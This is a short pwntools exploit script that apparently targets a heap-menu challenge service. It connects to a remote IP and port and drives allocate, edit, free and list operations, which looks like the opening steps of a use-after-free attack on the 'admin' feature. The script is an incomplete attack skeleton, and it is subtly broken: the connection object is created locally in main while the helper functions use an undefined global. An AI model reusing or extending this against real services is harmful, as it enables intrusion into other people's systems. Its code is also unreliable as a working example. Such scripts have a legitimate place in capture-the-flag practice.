from pwn import *
import sys

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()

def alloc(ind, size, name):
    sl(b'1')
    sla("Index: ", str(ind))
    sla("Size: ", str(size))
    sla("Username: ", name)

def edit(ind, size, name):
    sl(b'2')
    sla("Index: ", str(ind))
    sla("Size: ", str(size))
    sla("Username: ", name)

def free(ind):
    sl(b'3')
    sla("Index: ", str(ind))

def list_all():
    sl(b'4')

def admin(ind):
    sl(b'5')
    sla("What's the index of your username?:", str(ind))

def main(ip,port): # flag_id optional arg
    io = remote(ip, int(port))
    sl(b'a')
    alloc(0, 0x20, b"A"*0x10)
    edit(0, 0x10, b"A"*0x8)
    free(0)
    list_all()

    print(ip,port)




if __name__ == '__main__':
    main(sys.argv[1:][0],sys.argv[1:][1]) # sys.argv[1:][2])